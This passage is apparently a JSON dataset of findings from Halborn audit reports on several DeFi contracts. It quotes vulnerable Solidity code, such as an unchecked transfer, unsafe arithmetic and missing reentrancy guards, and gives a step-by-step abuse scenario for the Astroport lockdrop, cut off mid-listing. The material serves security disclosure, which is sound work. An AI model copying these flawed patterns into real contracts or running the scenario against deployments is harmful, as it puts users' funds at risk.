        "body": "The following functions, variables, and events in the ProductTokenCore contract have a typo: Plateform instead of Platform.  Line 64: uint256 private plateformFee;  Line 150: event ClaimPlateformFee(address indexed sender, uint256 amount);  Line 411: _updatePlateformFee(fee * (FEE_RATE_IN_BUY - FEE_MULTIPLIER)/ FEE_RATE_IN_BUY);  Line 440: _updatePlateformFee(fee * (FEE_RATE_IN_SELL - FEE_MULTIPLIER)/ FEE_RATE_IN_SELL);  Line 464: _updatePlateformFee(fee * (FEE_RATE_IN_SELL - FEE_MULTIPLIER)/ FEE_RATE_IN_SELL);  Line 488: function _updatePlateformFee(uint256 fee_)internal virtual {  Line 489: plateformFee = plateformFee + fee_;  Line 551: function getPlateformFee()external view virtual returns( uint256 amount){  Line 553: return plateformFee;  Line 562: function claimPlateformFee(uint256 amount_)external virtual {  Line 564: require(amount_ <= plateformFee, \"amount is exceed\");  Line 567: plateformFee = plateformFee - amount_;  Line 569: emit ClaimPlateformFee(_msgSender(), amount_); Risk Level: Likelihood - 1 Impact - 1 24 Recommendation: It is recommended to correct the typo in all the functions, variables, and events mentioned. Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID 97746779dd28d751e1d1ce87b2c123300928704c 25 ",
        "labels": [
            "Halborn",
            "HighStreetMarket_ProductToken",
            "Severity: Informational"
        ]
    },
    {
        "title": "INTEGER OVERFLOW",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/WolfyStreetBets_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "An overflow happens when an arithmetic operation reaches the maximum size of a type. In computer programming, an integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of bits -- either larger than the maximum or lower than the minimum re-presentable value. Code Location: WolfyStreetBetsV1.sol - Line #670-671 Listing 1: WolfyStreetBetsV1.sol 1 function startPool ( uint256 _predictionAsset1 , uint256 _predictionAsset2 ) public onlyOwner { 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 require (! poolStarted , \" Previous pool not finalized yet \" ); require ( totalLiquidityLowRisk + liquidityDetailsOwner . _lowRisk > 0 ,\" Low Risk Pool : Please add liquidity \" ); require ( totalLiquidityHighRisk + liquidityDetailsOwner . _highRisk > 0 ,\" High Risk Pool : Please add liquidity \") ; // 30 minutes for testing ONLY require ( block . timestamp > liquidityCycleStartTime . add (30 minutes ) , \" Cannot start pool during liquidity cycle \" ); // PLEASE UNCOMMENT ME FOR MAINNET // require ( block . timestamp > liquidityCycleStartTime . add (12 hours ) , \" Cannot start pool during liquidity cycle \") ; predictionAsset1 = _predictionAsset1 ; predictionAsset2 = _predictionAsset2 ; poolStartTime = block . timestamp ; poolStarted = true ; liquidityCycle = false ; 14 17 } WolfyStreetBetsV1.sol - Line #728-729-730-733-734-735-736-739 Listing 2: WolfyStreetBetsV1.sol 1 function stake ( uint256 _amount , bool _isLowRisk ) public { 2 require ( _amount > 0 , \" You can 't stake with 0. Choose an 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 amount ! \" ); require ( poolStarted , \" Cannot stake until pool has been started ! \"); // FOR MAINNET PLEASE UNCOMMENT ME // require ( block . timestamp <= poolStartTime . add (12 hours ) ,\"12 hour staking window has now passed !\" ) ; // Can stake upto 12 hours from start pool . uint256 stakeAmount ; if ( liquidityReward >= 1) { stakeAmount = _amount . sub ((( _amount . mul ( liquidityReward ) ). div (100) ) . div (10) ) ; } else { stakeAmount = _amount ; } if ( _isLowRisk ) { require ( ledgerL . add ( stakeAmount ) <= ( totalLiquidityLowRisk + liquidityDetailsOwner . _lowRisk ). mul (6) , \" Low risk pool : Staking limit reached ! \" ); require ( _poolBalances [ _msgSender () ][ _isLowRisk ]. add ( stakeAmount ) <= ( totalLiquidityLowRisk + liquidityDetailsOwner . _lowRisk ). mul (6) , \" Low risk pool : Staking limit reached ! \" ); liquidityRewardCollectedLowRisk += (( _amount . mul ( liquidityReward )) . div (100) ). div (10) ; ledgerL += stakeAmount ; } else { require ( ledgerH . add ( stakeAmount ) <= ( totalLiquidityHighRisk + liquidityDetailsOwner . 15 _highRisk ). mul (3) , \" High risk pool : Staking limit reached ! \" ); require ( _poolBalances [ _msgSender () ][ _isLowRisk ]. add ( stakeAmount ) <= ( totalLiquidityHighRisk + liquidityDetailsOwner . _highRisk ). mul (3) , \" High risk pool : Staking limit reached ! \"); liquidityRewardCollectedHighRisk += (( _amount . mul ( liquidityReward )) . div (100) ). div (10) ; ledgerH += stakeAmount ; } _isLowRisk == true ? storeUsers ( _msgSender () , _lowRiskUsers ): storeUsers ( _msgSender () , _highRiskUsers ); _poolBalances [ _msgSender () ][ _isLowRisk ] += stakeAmount ; TOKEN . safeTransferFrom ( _msgSender () , address ( this ) , _amount ); distributeLiquidityRewards ( true ); distributeLiquidityRewards ( false ); } 23 24 25 26 27 28 29 30 31 32 33 34 Risk Level: Likelihood - 3 Impact - 3 Recommendation: Consider to replace all + - * / mathematical operations via Safe Math li- brary implementations. (add-sub-mul-div) It is recommended to use vetted safe math libraries for arithmetic operations consistently throughout the smart contract system or use pragma version bigger than 0.8.0 that adds arithmetic checks automatically. Remediation Plan: SOLVED: WOLFY Team rightly implemented mathematical operations. All math- ematical operations are completed through SafeMath. 16 ",
        "labels": [
            "Halborn",
            "WolfyStreetBets",
            "Severity: Medium"
        ]
    },
    {
        "title": "DIVIDE BEFORE MULTIPLY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/WolfyStreetBets_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "Solidity integer division might truncate. As a result, performing mul- tiplication before division can sometimes avoid loss of precision. In this audit, there are multiple instances found where division is being performed before multiplication operation in the WolfyStreetBetsV1.sol. Code Location: WolfyStreetBetsV1.sol Line #1019-1025 Listing 3: EglContract.sol (Lines ) 1016 function 1017 1018 distributeLiquidityRewards ( bool _isLowRisk ) internal { for ( uint i =0; i < LiquidityDetailsRecord . length ; i ++) { if ( _isLowRisk && LiquidityDetailsRecord [ i ]. isLowRisk 1019 1020 1021 1022 1023 1024 1025 == true ) { uint256 rewardPerc = (( LiquidityDetailsRecord [ i ]. _lowRisk . mul (10** decimals () )) . mul (100*10** decimals () )) . div ( totalLiquidityLowRisk . mul (10** decimals () )) ; uint256 rewardAmount = (( liquidityRewardCollectedLowRisk . mul (10** decimals () ) ). mul ( rewardPerc ) ) /(100 * 10** decimals () ); rewardPaidRecord [ LiquidityDetailsRecord [ i ]. _address ]. push ( RewardPaid ( rewardAmount . div (10** decimals () ) , block . timestamp , false )) ; userLPReward [ LiquidityDetailsRecord [i ]. _address ] += rewardAmount ; } else if ( _isLowRisk == false && LiquidityDetailsRecord [ i ]. isLowRisk == false ) { uint256 rewardPerc = (( LiquidityDetailsRecord [ i ]. _highRisk . mul (10** decimals () )) . mul (100*10** decimals () )) . div ( totalLiquidityHighRisk . mul (10** decimals () )) ; 17 1026 1027 1028 1029 1030 1031 1032 1033 1034 1035 1036 1037 1038 uint256 rewardAmount = (( liquidityRewardCollectedHighRisk . mul (10** decimals () ) ). mul ( rewardPerc ) ) /(100 * 10** decimals () ); rewardPaidRecord [ LiquidityDetailsRecord [ i ]. _address ]. push ( RewardPaid ( rewardAmount . div (10** decimals () ) , block . timestamp , false )) ; userLPReward [ LiquidityDetailsRecord [i ]. _address ] += rewardAmount ; } } if ( _isLowRisk ) { liquidityRewardCollectedLowRisk = 0; } else { liquidityRewardCollectedHighRisk = 0; } } Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider doing multiplication operation before division to prevail pre- cision in the values in non floating data type. Remediation Plan: SOLVED: WOLFY Team rightly implemented mathematical operations. The cal- culation is adjusted according to suggestion. 18 ",
        "labels": [
            "Halborn",
            "WolfyStreetBets",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF FUNCTIONALITY ON THE TRUSTED FORWARDER FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/WolfyStreetBets_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "In the WolfyStreetBetsV1.sol contract, trusted forwarder has been used for biconomy upgrades. However, the function didnt set trusted forwarder there that is uncomplete. Code Location: Listing 4: WolfyStreetBetsV1.sol (Lines ) 609 610 611 612 613 614 615 /* * * @dev Updates trusted forwarder should biconomy upgrades occur . */ function setTrustedForwarder ( address _trustedForwarder ) public view onlyOwner { require ( _trustedForwarder != address (0) , \" Address cannot be 0 x0 \" ); require ( _trustedForwarder != address ( this ) , \" Address cannot be contract address \" ); } Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to set trusted forwarder on the related function. If that functionality will not use, for gas improvement the function should be deleted from the code base. 19 Listing 5: WolfyStreetBetsV1.sol (Lines ) 609 610 611 612 613 614 615 616 617 618 /* * * @dev Updates trusted forwarder should biconomy upgrades occur . */ function setTrustedForwarder ( address _trustedForwarder ) public view onlyOwner { require ( _trustedForwarder != address (0) , \" Address cannot be 0 x0 \" ); require ( _trustedForwarder != address ( this ) , \" Address cannot be contract address \" ); trustedForwarder = _trustedForwarder ; emit TrustedForwarderSet ( trustedForwarder ); } Remediation Plan: SOLVED: WOLFY Team modified the code to set trusted forwarder on the related function. 20 ",
        "labels": [
            "Halborn",
            "WolfyStreetBets",
            "Severity: Low"
        ]
    },
    {
        "title": "GAS IMPROVEMENT ON THE WITHDRAW LIQUIDITY FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/WolfyStreetBets_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "In the WolfyStreetBetsV1.sol contract, _isLowRisk variable is used for checking multiple conditions on the provideLiquidity function. However, This that function redundantly checked multiple if/else statements. implementation will spend more gas with multiple inner statemements. Code Location: WolfyStreetBetsV1.sol Listing 6: WolfyStreetBetsV1.sol 952 function provideLiquidity ( uint256 amount , bool _isLowRisk ) 953 954 955 956 957 958 959 960 961 962 963 964 965 966 967 968 969 970 public { if ( _msgSender () != owner () ) { if ( _isLowRisk ) { LiquidityDetailsRecord . push ( LiquidityDetails ( amount ,0 , _msgSender () , block . timestamp , true , false , false )) ; } else { LiquidityDetailsRecord . push ( LiquidityDetails (0 , amount , _msgSender () , block . timestamp , false , false , false )) ; } if ( _isLowRisk == true ) { totalLiquidityLowRisk += amount ; currentLowLiquidity [ _msgSender () ] += amount ; storeUsers ( _msgSender () , LiquidityLRUsers ); } else { totalLiquidityHighRisk += amount ; currentHighLiquidity [ _msgSender () ] += amount ; storeUsers ( _msgSender () , LiquidityHRUsers ); } 21 971 972 } Recommendation: Consider to eliminate multiple condition check which proposes same inner statements. Listing 7: WolfyStreetBetsV1.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function provideLiquidity ( uint256 amount , bool _isLowRisk ) public { if ( _msgSender () != owner () ) { if ( _isLowRisk ) { LiquidityDetailsRecord . push ( LiquidityDetails ( amount ,0 , _msgSender () , block . timestamp , true , false , false )) ; totalLiquidityLowRisk += amount ; currentLowLiquidity [ _msgSender () ] += amount ; storeUsers ( _msgSender () , LiquidityLRUsers ); } else { LiquidityDetailsRecord . push ( LiquidityDetails (0 , amount , _msgSender () , block . timestamp , false , false , false )) ; totalLiquidityHighRisk += amount ; currentHighLiquidity [ _msgSender () ] += amount ; storeUsers ( _msgSender () , LiquidityHRUsers ); } .... } Remediation Plan: SOLVED: WOLFY Team removed the excess of if/else statements. 22 ",
        "labels": [
            "Halborn",
            "WolfyStreetBets",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING EVENTS EMITTING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/WolfyStreetBets_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "It has been observed that critical functionality is missing emitting event for some functions on the WolfyStreetBetsV1.sol contract. These functions should emit events after completing the transactions. Code Location: Listing 8: Missing Events 1 function setTrustedForwarder ( address _trustedForwarder ) 2 function setWinFactorL ( uint256 _winFactorL ) 3 function setWinFactorH ( uint256 _winFactorH ) 4 function storeUsers ( address receiver , address [] storage arrayData ) 5 function startPool ( uint256 _predictionAsset1 , uint256 _predictionAsset2 ) 6 function stopPool ( uint256 _predictionAsset1 , uint256 _predictionAsset2 ) 7 function stake ( uint256 _amount , bool _isLowRisk ) 8 function rewardManager ( uint256 _factor , bool _res ) 9 function withdrawPredictionStake ( uint256 _amount , bool _isLowRisk ) 10 function provideLiquidity ( uint256 amount , bool _isLowRisk ) 11 function withdrawLiquidityRewards ( uint256 amount ) Risk Level: Likelihood - 1 Impact - 2 Recommendations: Consider emitting an event when calling related functions on the list above. 23 Remediation Plan: SOLVED: WOLFY Team added events on the functions. 24 ",
        "labels": [
            "Halborn",
            "WolfyStreetBets",
            "Severity: Informational"
        ]
    },
    {
        "title": "IMPROPER CHECK EFFECT INTERACTION PATTERN USAGE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/WolfyStreetBets_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "In the Smart Contracts, The check effect interaction pattern is used to reduce the attack surface for malicious contracts trying to hijack control flow after an external call. In the WolfyStreetBetsV1.sol, ledgerL and ledgerH is updated after an external call. Code Location: Listing 9: WolfyStreetBetsV1.sol (Lines 118,119) 101 102 103 104 105 106 107 108 109 110 111 112 113 114 function withdrawPredictionStake ( uint256 _amount , bool _isLowRisk ) public nonReentrant { require (! poolStarted , \" Cannot withdraw Asset while pool is running \"); require ( _msgSender () != owner () ); require ( _amount <= _poolBalances [ _msgSender () ][ _isLowRisk ], \" Insufficient Balance \"); _poolBalances [ _msgSender () ][ _isLowRisk ] -= _amount ; TOKEN . safeTransfer ( _msgSender () , _amount ); if ( _isLowRisk ) { ledgerL -= _amount ; } else { ledgerH -= _amount ; } } Risk Level: Likelihood - 1 Impact - 1 25 Recommendations: In the withdrawPredictionStake function, ledgerL and ledgerH should be updated before an external call. Remediation Plan: SOLVED: External call is currently done after ledgerL and ledgerH are updated. 26 ",
        "labels": [
            "Halborn",
            "WolfyStreetBets",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/WolfyStreetBets_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "In the public functions, array arguments are immediately copied to mem- ory, while external functions can read directly from calldata. Reading Public functions need to calldata is cheaper than memory allocation. write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Also, methods do not necessarily have to be public if they are only called within the contract-in such case they should be marked internal. Affected Smart Contract Functions: WolfyStreetBetsV1: provideLiquidity,withdrawPredictionStake,stake,stopPool,startPool,setWinFactorL ,setWinFactorH,setTrustedForwarder Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider as much as possible declaring external variables instead of public variables. As for best practice, you should use external if you expect that the function will only be called externally and use public if you need to call the function internally. To sum up, all can access to public functions, external functions only can be accessed externally and internal functions can only be called within the contract. 27 Remediation Plan: SOLVED: WOLFY Team declared an external instead of public in the suggested functions. 28 ",
        "labels": [
            "Halborn",
            "WolfyStreetBets",
            "Severity: Informational"
        ]
    },
    {
        "title": "IMPROPER INPUT VALIDATION ON THE PREDICTION ASSETS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/WolfyStreetBets_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "In the WolfyStreetBetsV1.sol contract, after providing liquidity to the The startPool function takes two pool, an owner can start the pool. argument named as _predictionAsset1 and _predictionAsset2. However, these function arguments are not validated. Code Location: Listing 10: WolfyStreetBetsV1.sol (Lines ) 668 function startPool ( uint256 _predictionAsset1 , uint256 _predictionAsset2 ) public { 669 670 671 672 673 674 675 676 677 678 679 680 681 682 683 684 require (! poolStarted , \" Previous pool not finalized yet \" ); require ( totalLiquidityLowRisk + liquidityDetailsOwner . _lowRisk > 0 ,\" Low Risk Pool : Please add liquidity \" ); require ( totalLiquidityHighRisk + liquidityDetailsOwner . _highRisk > 0 ,\" High Risk Pool : Please add liquidity \") ; // 30 minutes for testing ONLY require ( block . timestamp > liquidityCycleStartTime . add (30 minutes ) , \" Cannot start pool during liquidity cycle \" ); // PLEASE UNCOMMENT ME FOR MAINNET // require ( block . timestamp > liquidityCycleStartTime . add (12 hours ) , \" Cannot start pool during liquidity cycle \") ; predictionAsset1 = _predictionAsset1 ; predictionAsset2 = _predictionAsset2 ; poolStartTime = block . timestamp ; poolStarted = true ; liquidityCycle = false ; } 29 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider to validate function arguments. To preventing miscalculation, these function arguments should be more than zero. Remediation Plan: SOLVED: WOLFY Team added validation in the function arguments. 30 ",
        "labels": [
            "Halborn",
            "WolfyStreetBets",
            "Severity: Informational"
        ]
    },
    {
        "title": "REDUNDANT STATEMENT ON THE REWARD MANAGER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/WolfyStreetBets_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "the contract, WolfyStreetBetsV1.sol func- In tion adjusts pool balances due to risk score. On the function, previousResultRecord variable has been used for keeping record results. But, these records are not used in the contract. The redundant statements will spend gas more. manager reward the Code Location: Listing 11: WolfyStreetBetsV1.sol (Lines ) 812 813 814 815 816 817 818 819 820 821 822 823 824 ... if ( _factor >= winFactorL && _res == true ) { // LR | PROFIT => +12% for ( uint i = 0 ; i < _lowRiskUsers . length ; i ++) { if ( liquidityDetailsOwner . _lowRisk >= _poolBalances [ _lowRiskUsers [ i ]][ true ]. mul (120) . div (1000) ) { liquidityDetailsOwner . _lowRisk -= _poolBalances [ _lowRiskUsers [i ]][ true ]. mul (120) . div (1000) ; _profitStakers [ _lowRiskUsers [ i ]][ true ] += _poolBalances [ _lowRiskUsers [i ]][ true ]. mul (120) . div (1000) ; _poolBalances [ _lowRiskUsers [ i ]][ true ] += _poolBalances [ _lowRiskUsers [i ]][ true ]. mul (120) . div (1000) ; previousResultRecord . push ( ResultRecord ( true , true )) ; } else { liquidityDetailsOwner . _lowRisk = 0; _profitStakers [ _lowRiskUsers [ i ]][ true ] += _poolBalances [ _lowRiskUsers [i ]][ true ]. mul (120) . div (1000) ; _poolBalances [ _lowRiskUsers [ i ]][ true ] += _poolBalances [ _lowRiskUsers [i ]][ true ]. mul 31 (120) . div (1000) ; previousResultRecord . push ( ResultRecord ( true , true )) ; 825 826 827 828 } } ... } Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider to delete redundant statements from the contract. Remediation Plan: ACKNOWLEDGED: WOLFY Team claims that the use of previousResultRecord is intended in the code because it is returned in a view function for front-end proposes. 32 3.10 (HAL-10) MISUSE OF GAS ON THE PAYOUTOWNERLIQUIDITY FUNCTION - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "WolfyStreetBets",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNCHECKED TRANSFER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KwikSwap_Factory_Contract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "contracts Kiwkswap Router02.sol has The removeLiquidity() method and in this method, transferFrom() is being Several called without any implementing checks on the return value. tokens do not revert in case of failure and return false. Kwikswap Router01.sol and Code Location: Listing 1: Kiwkswap Router02.sol (Lines 484) 483 484 485 486 address pair = KwikswapV1Library . pairFor ( factory , tokenA , tokenB ); IKwikswapV1Pair ( pair ). transferFrom ( msg . sender , pair , liquidity ); // send liquidity to pair ( uint amount0 , uint amount1 ) = IKwikswapV1Pair ( pair ). burn ( to ); ( address token0 ,) = KwikswapV1Library . sortTokens ( tokenA , tokenB ); Listing 2: Kwikswap Router01.sol (Lines 466) 465 466 467 468 address pair = KwikswapV1Library . pairFor ( factory , tokenA , tokenB ); IKwikswapV1Pair ( pair ). transferFrom ( msg . sender , pair , liquidity ); // send liquidity to pair ( uint amount0 , uint amount1 ) = IKwikswapV1Pair ( pair ). burn ( to ); ( address token0 ,) = KwikswapV1Library . sortTokens ( tokenA , tokenB ); 13 Risk Level: Likelihood - 3 Impact - 3 Recommendation: Use SafeERC20, or ensure that the transferFrom return value is checked. Remediation Plan: SOLVED: Contracts Kiwkswap Router02 and Kiwkswap Router01 are now using SafeERC20. 14 ",
        "labels": [
            "Halborn",
            "KwikSwap_Factory_Contract",
            "Severity: Medium"
        ]
    },
    {
        "title": "PRAGMA VERSION DEPRECATED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KwikSwap_Factory_Contract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "The current version in use for the contracts is pragma =0.5.12 for KwikswapV1ERC20.sol, KwikswapV1Factory.sol and KwikswapV1Pair.sol while =0.6.6 for Kiwkswap Router02.sol and Kwikswap Router01.sol. While these version is still functional, and most security issues safely implemented by mitigating contracts with other utility contracts such as SafeMath.sol and ReentrancyGuard.sol, the risk to the long-term sustainability and integrity of the solidity code increases. Code Location: Listing swapV1Pair.sol 3: KwikswapV1ERC20.sol, KwikswapV1Factory.sol and Kwik- 59 pragma solidity =0.5.16; Listing 4: Kiwkswap Router02.sol and Kwikswap Router01.sol 59 pragma solidity =0.6.6; Risk Level: Likelihood - 1 Impact - 3 Recommendations: At the time of this audit, the current version is already at 0.8.2. When possible, use the most updated and tested pragma versions to take advantage of new features that provide checks and accounting, as well as prevent insecure use of code. (0.6.12) 15 Remediation Plan: RISK ACCEPTED: Kwikswap team wants to continue with this pragma version. 16 ",
        "labels": [
            "Halborn",
            "KwikSwap_Factory_Contract",
            "Severity: Low"
        ]
    },
    {
        "title": "USE OF BLOCK.TIMESTAMP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KwikSwap_Factory_Contract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "During a manual static review, the tester noticed the use of block. timestamp in KwikswapV1ERC20.sol and KwikswapV1Pair.sol contracts. The contract developers should be aware that this does not mean current time. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. The use of now creates a risk that time manipulation can be performed to manipulate price oracles. Miners can modify the timestamp by up to 900 seconds. Code Location: Listing 5: KwikswapV1ERC20.sol (Lines 82) 81 82 83 84 85 86 87 88 function permit ( address owner , address spender , uint value , uint deadline , uint8 v , bytes32 r , bytes32 s) external { require ( deadline >= block . timestamp , ' KwikswapV1 : EXPIRED ' ); bytes32 digest = keccak256 ( abi . encodePacked ( '\\ x19 \\ x01 ' , DOMAIN_SEPARATOR , keccak256 ( abi . encode ( PERMIT_TYPEHASH , owner , spender , value , nonces [ owner ]++ , deadline )) ) Listing 6: KwikswapV1Pair.sol (Lines 77) 73 74 75 76 77 function _update ( uint balance0 , uint balance1 , uint112 _reserve0 , uint112 _reserve1 ) private { require ( balance0 <= uint112 ( -1) && balance1 <= uint112 ( -1) , ' KwikswapV1 : OVERFLOW '); uint32 blockTimestamp = uint32 ( block . timestamp % 2**32) ; uint32 timeElapsed = blockTimestamp - blockTimestampLast ; // overflow is desired if ( timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) { 17 Risk Level: Likelihood - 1 Impact - 4 Recommendation: Use block.number instead of block.timestamp to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: SOLVED: Contracts KwikswapV1Pair and KwikswapV1ERC20 are now using block .number instead of block.timestamp. 18 ",
        "labels": [
            "Halborn",
            "KwikSwap_Factory_Contract",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ZERO",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KwikSwap_Factory_Contract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "contracts KwikswapV1Factory.sol, Kiwkswap The Router02.sol and Kwikswap Router01.sol should perform a zero-address validation check when assigning the user supplied address values to state variables. KwikswapV1Pair.sol, Code Location: Listing 7: KwikswapV1Factory.sol (Lines 16) 15 16 17 constructor ( address _feeToSetter ) public { feeToSetter = _feeToSetter ; } Listing 8: KwikswapV1Factory.sol (Lines 42) 40 41 42 43 function setFeeTo ( address _feeTo ) external { require ( msg . sender == feeToSetter , ' KwikswapV1 : FORBIDDEN ' ); feeTo = _feeTo ; } Listing 9: KwikswapV1Factory.sol (Lines 47) 45 46 47 48 function setFeeToSetter ( address _feeToSetter ) external { require ( msg . sender == feeToSetter , ' KwikswapV1 : FORBIDDEN ' ); feeToSetter = _feeToSetter ; } 19 Listing 10: KwikswapV1Pair.sol (Lines 68,69) 66 67 68 69 70 function initialize ( address _token0 , address _token1 ) external { require ( msg . sender == factory , ' KwikswapV1 : FORBIDDEN '); // sufficient check token0 = _token0 ; token1 = _token1 ; } Listing 11: Kiwkswap Router02.sol (Lines 395,396) 394 395 396 397 constructor ( address _factory , address _WETH ) public { factory = _factory ; WETH = _WETH ; } Listing 12: Kwikswap Router01.sol (Lines 378,379) 377 378 379 380 constructor ( address _factory , address _WETH ) public { factory = _factory ; WETH = _WETH ; } Risk Level: Likelihood - 2 Impact - 2 Recommendation: Add address validation for user-supplied values in addition to the existing OpenZeppelin RBAC controls. Remediation Plan: SOLVED: Contracts KwikswapV1Pair, KwikswapV1Factory, Kwikswap Router01 and Kiwkswap Router02 added address validation for user-supplied values. 20 ",
        "labels": [
            "Halborn",
            "KwikSwap_Factory_Contract",
            "Severity: Low"
        ]
    },
    {
        "title": "IGNORE RETURN VALUES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KwikSwap_Factory_Contract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "The return value of an external call is not stored in a local or state variable. In the contracts Kiwkswap Router02.sol and Kwikswap Router01. sol, there are instances where external methods are being called and the return value is being ignored. Code Location: Listing 13: Kiwkswap Router02.sol (Lines 414) 413 414 415 416 if ( IKwikswapV1Factory ( factory ). getPair ( tokenA , tokenB ) == address (0) ) { IKwikswapV1Factory ( factory ). createPair ( tokenA , tokenB ) ; } ( uint reserveA , uint reserveB ) = KwikswapV1Library . getReserves ( factory , tokenA , tokenB ); Listing 14: Kwikswap Router01.sol (Lines 397) 396 397 398 399 if ( IKwikswapV1Factory ( factory ). getPair ( tokenA , tokenB ) == address (0) ) { IKwikswapV1Factory ( factory ). createPair ( tokenA , tokenB ) ; } ( uint reserveA , uint reserveB ) = KwikswapV1Library . getReserves ( factory , tokenA , tokenB ); Risk Level: Likelihood - 3 Impact - 2 21 Recommendation: Add a return value check to avoid unexpected errors. Return value checks ensure proper exception handling. Remediation Plan: SOLVED: Contracts Kwikswap Router01 and Kwikswap Router02 added a return value check to avoid unexpected errors. 22 ",
        "labels": [
            "Halborn",
            "KwikSwap_Factory_Contract",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING RE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KwikSwap_Factory_Contract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "To protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the withdraw function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against reentrancy attacks. Risk Level: Likelihood - 1 Impact - 1 Recommendation: In the KwikswapV1Pair.sol and KwikswapV1Factory.sol contracts, functions like KwikswapV1Pair.burn(), KwikswapV1Pair.swap() and KwikswapV1Factory Use the nonReentrant .createPair() are missing nonReentrant guard. modifier to avoid introducing future vulnerabilities. Remediation Plan: RISK ACCEPTED: Kwikswap team are fine with not adding nonReenrant guard in their contracts. 23 ",
        "labels": [
            "Halborn",
            "KwikSwap_Factory_Contract",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBILITY TO WITHDRAW TERRASWAP LP TOKENS AFTER CLAIMING REWARDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Periphery_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "contract- handle_claim_rewards_and_unlock_for_lockup if users s/lockdrop/src/contract.rs state.are_claims_allowed is set to true. However, if the claiming is enabled too early (i.e.: before deposit and withdrawal windows), users will even be able to withdraw their Terraswap LP tokens after claiming rewards. function claim in their rewards allow to Attack scenario: 1. Owner deploys lockdrop, auction and airdrop contracts. In particu- lar, init_timestamp for auction contract is incorrectly set. 2. As part of usual protocol working, users deposit UST to auction contract during its deposit window. 3. As part of usual protocol working, users claim rewards (ASTRO tokens) in airdrop contract and their claimed_amount increase. 15 4. As part of usual protocol working, users delegate ASTRO tokens to auction contract. 5. Once deposit and withdrawal windows finish for auction contract, owner can initialize pool, which enables claims for lockdrop and airdrop contracts. 6. Users increase lockup position size in lockdrop contract and claim rewards (ASTRO tokens). 7. Finally, users can withdraw their Terraswap LP tokens from lockdrop contract and keep their rewards. A proof of concept video showing how to exploit this security issue is included in the report. It is important to mention that this situation can happen under the following circumstances:  init_timestamp in auction contract is incorrectly set, see HAL-03 for more details.  init_timestamp in lockdrop contract is incorrectly set.  Deposit / withdrawal windows are incorrectly set in lockdrop or auction contracts. Code Location: The function only verifies if state.are_claims_allowed is set to true before allowing users claim their rewards. Listing 1: contracts/lockdrop/src/contract.rs (Lines 892) 882 pub fn 